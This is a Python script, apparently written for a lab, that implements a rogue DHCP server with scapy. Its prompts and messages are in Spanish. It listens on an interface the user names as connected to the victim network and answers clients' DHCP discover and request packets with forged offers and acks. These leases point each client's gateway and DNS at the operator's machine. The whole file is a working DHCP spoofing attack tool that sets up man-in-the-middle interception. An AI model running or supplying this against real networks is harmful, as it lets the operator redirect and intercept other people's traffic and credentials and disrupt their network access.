import argparse
import ipaddress
import os
import random
import signal
import subprocess
import sys
import time
from scapy.all import BOOTP, DHCP, Ether, IP, UDP, conf, get_if_hwaddr, sendp, sniff

running = True

def stop_handler(sig, frame):
    global running
    running = False

signal.signal(signal.SIGINT, stop_handler)
signal.signal(signal.SIGTERM, stop_handler)

def require_root():
    if hasattr(os, "geteuid") and os.geteuid() != 0:
        print("Ejecuta con sudo")
        sys.exit(1)

def run_cmd(cmd):
    try:
        return subprocess.check_output(cmd, text=True, stderr=subprocess.DEVNULL).strip()
    except Exception:
        return ""

def list_interfaces():
    interfaces = []

    for iface in sorted(os.listdir("/sys/class/net")):
        if iface == "lo":
            continue

        if os.path.exists(f"/sys/class/net/{iface}"):
            interfaces.append(iface)

    return interfaces

def get_ip_line(iface):
    line = run_cmd(["ip", "-br", "addr", "show", iface])
    return line if line else iface

def choose_interface(default_iface="eth0"):
    interfaces = list_interfaces()

    if not interfaces:
        print("No se encontraron interfaces de red")
        sys.exit(1)

    print("")
    print("Interfaces disponibles:")
    print("")

    for idx, iface in enumerate(interfaces, 1):
        print(f"{idx}. {get_ip_line(iface)}")

    print("")

    if default_iface not in interfaces:
        default_iface = interfaces[0]

    value = input(f"Interfaz conectada a la red víctima [Enter = {default_iface}]: ").strip()

    if value == "":
        return default_iface

    if value.isdigit():
        pos = int(value)

        if 1 <= pos <= len(interfaces):
            return interfaces[pos - 1]

    if value in interfaces:
        return value

    print(f"Interfaz inválida: {value}")
    sys.exit(1)

def valid_ip(value):
    try:
        ipaddress.ip_address(value)
        return True
    except Exception:
        return False

def ip_to_int(ip):
    return int(ipaddress.IPv4Address(ip))

def int_to_ip(value):
    return str(ipaddress.IPv4Address(value))

def parse_pool(pool):
    if "-" not in pool:
        print("El pool debe tener formato inicio-fin, ejemplo: 20.25.8.100-20.25.8.200")
        sys.exit(1)

    start, end = pool.split("-", 1)
    start = start.strip()
    end = end.strip()

    if not valid_ip(start) or not valid_ip(end):
        print("Pool inválido")
        sys.exit(1)

    start_int = ip_to_int(start)
    end_int = ip_to_int(end)

    if start_int > end_int:
        print("El inicio del pool no puede ser mayor que el final")
        sys.exit(1)

    return start_int, end_int

def get_dhcp_option(pkt, option_name):
    if DHCP not in pkt:
        return None

    for option in pkt[DHCP].options:
        if isinstance(option, tuple) and option[0] == option_name:
            return option[1]

    return None

def mac_to_clean(mac):
    return mac.lower().replace(":", "")

def next_pool_ip(state):
    start = state["pool_start"]
    end = state["pool_end"]
    excluded = state["excluded"]

    for _ in range(start, end + 1):
        current = state["next_ip"]

        if current > end:
            current = start

        state["next_ip"] = current + 1
        ip = int_to_ip(current)

        if ip not in excluded and ip not in state["used_ips"]:
            state["used_ips"].add(ip)
            return ip

    print("No quedan IPs disponibles en el pool")
    return None

def get_lease(mac, state):
    if mac in state["leases"]:
        return state["leases"][mac]

    ip = next_pool_ip(state)

    if ip is None:
        return None

    state["leases"][mac] = ip
    return ip

def make_dhcp_packet(args, state, request_pkt, message_type, yiaddr):
    client_mac = request_pkt[Ether].src
    server_mac = state["server_mac"]
    xid = request_pkt[BOOTP].xid
    flags = request_pkt[BOOTP].flags
    chaddr = request_pkt[BOOTP].chaddr

    options = [
        ("message-type", message_type),
        ("server_id", args.server_ip),
        ("lease_time", args.lease_time),
        ("renewal_time", int(args.lease_time * 0.5)),
        ("rebinding_time", int(args.lease_time * 0.875)),
        ("subnet_mask", args.subnet_mask),
        ("router", args.gateway),
        ("name_server", args.dns),
        ("domain", args.domain),
        "end"
    ]

    pkt = (
        Ether(src=server_mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src=args.server_ip, dst="255.255.255.255") /
        UDP(sport=67, dport=68) /
        BOOTP(
            op=2,
            htype=1,
            hlen=6,
            xid=xid,
            flags=flags,
            yiaddr=yiaddr,
            siaddr=args.server_ip,
            chaddr=chaddr
        ) /
        DHCP(options=options)
    )

    return pkt

def send_offer(args, state, pkt, offered_ip):
    response = make_dhcp_packet(args, state, pkt, "offer", offered_ip)
    sendp(response, iface=args.iface, verbose=False)
    state["offers"] += 1

    print(
        f"OFFER enviado -> cliente={pkt[Ether].src} "
        f"ip={offered_ip} gateway={args.gateway} dns={args.dns}"
    )

def send_ack(args, state, pkt, assigned_ip):
    response = make_dhcp_packet(args, state, pkt, "ack", assigned_ip)
    sendp(response, iface=args.iface, verbose=False)
    state["acks"] += 1

    print(
        f"ACK enviado -> cliente={pkt[Ether].src} "
        f"ip={assigned_ip} gateway={args.gateway} dns={args.dns}"
    )

def handle_packet(args, state, pkt):
    if DHCP not in pkt or BOOTP not in pkt or Ether not in pkt:
        return

    msg_type = get_dhcp_option(pkt, "message-type")

    if msg_type is None:
        return

    client_mac = pkt[Ether].src
    clean_mac = mac_to_clean(client_mac)

    if msg_type == 1 or msg_type == "discover":
        offered_ip = get_lease(clean_mac, state)

        if offered_ip:
            send_offer(args, state, pkt, offered_ip)

    elif msg_type == 3 or msg_type == "request":
        requested_ip = get_dhcp_option(pkt, "requested_addr")
        assigned_ip = state["leases"].get(clean_mac)

        if requested_ip and ip_to_int(requested_ip) >= state["pool_start"] and ip_to_int(requested_ip) <= state["pool_end"]:
            assigned_ip = requested_ip
            state["leases"][clean_mac] = assigned_ip
            state["used_ips"].add(assigned_ip)

        if assigned_ip is None:
            assigned_ip = get_lease(clean_mac, state)

        if assigned_ip:
            send_ack(args, state, pkt, assigned_ip)

def validate_args(args):
    if not valid_ip(args.server_ip):
        print("server-ip inválida")
        sys.exit(1)

    if not valid_ip(args.gateway):
        print("gateway inválido")
        sys.exit(1)

    if not valid_ip(args.dns):
        print("dns inválido")
        sys.exit(1)

    if not valid_ip(args.subnet_mask):
        print("subnet-mask inválida")
        sys.exit(1)

    args.pool_start, args.pool_end = parse_pool(args.pool)

    excluded = set()

    for ip in args.exclude.split(","):
        ip = ip.strip()

        if ip == "":
            continue

        if not valid_ip(ip):
            print(f"IP excluida inválida: {ip}")
            sys.exit(1)

        excluded.add(ip)

    args.excluded_set = excluded

def main():
    parser = argparse.ArgumentParser(
        description="DHCP Spoofing lab script para entornos controlados"
    )

    parser.add_argument("-i", "--iface", default=None)
    parser.add_argument("--server-ip", default="20.25.8.46")
    parser.add_argument("--gateway", default="20.25.8.46")
    parser.add_argument("--dns", default="20.25.8.46")
    parser.add_argument("--subnet-mask", default="255.255.255.0")
    parser.add_argument("--pool", default="20.25.8.100-20.25.8.200")
    parser.add_argument("--exclude", default="20.25.8.45,20.25.8.46,20.25.8.47")
    parser.add_argument("--lease-time", type=int, default=3600)
    parser.add_argument("--domain", default="lab.local")
    parser.add_argument("--yes", action="store_true")

    args = parser.parse_args()

    require_root()

    if args.iface is None:
        args.iface = choose_interface("eth0")

    validate_args(args)

    try:
        server_mac = get_if_hwaddr(args.iface)
    except Exception:
        print(f"No pude obtener la MAC de {args.iface}")
        sys.exit(1)

    conf.iface = args.iface
    conf.verb = 0

    state = {
        "server_mac": server_mac,
        "pool_start": args.pool_start,
        "pool_end": args.pool_end,
        "next_ip": args.pool_start,
        "excluded": args.excluded_set,
        "leases": {},
        "used_ips": set(),
        "offers": 0,
        "acks": 0
    }

    print("")
    print("Configuración DHCP Spoofing:")
    print(f"iface={args.iface}")
    print(f"server_mac={server_mac}")
    print(f"server_ip={args.server_ip}")
    print(f"pool={args.pool}")
    print(f"excluded={','.join(sorted(args.excluded_set))}")
    print(f"gateway_ofrecido={args.gateway}")
    print(f"dns_ofrecido={args.dns}")
    print(f"subnet_mask={args.subnet_mask}")
    print(f"lease_time={args.lease_time}")
    print(f"domain={args.domain}")
    print("")

    if not args.yes:
        confirm = input("Presiona Enter para iniciar o escribe n para cancelar: ").strip().lower()

        if confirm in ["n", "no", "cancel", "cancelar"]:
            print("Cancelado")
            sys.exit(0)

    print("")
    print("Servidor DHCP falso iniciado. Usa Ctrl+C para detener")
    print("")

    try:
        sniff(
            iface=args.iface,
            filter="udp and (port 67 or port 68)",
            store=False,
            prn=lambda pkt: handle_packet(args, state, pkt),
            stop_filter=lambda pkt: not running
        )
    except KeyboardInterrupt:
        pass

    print("")
    print("Finalizado")
    print(f"offers={state['offers']}")
    print(f"acks={state['acks']}")

if __name__ == "__main__":
    main()
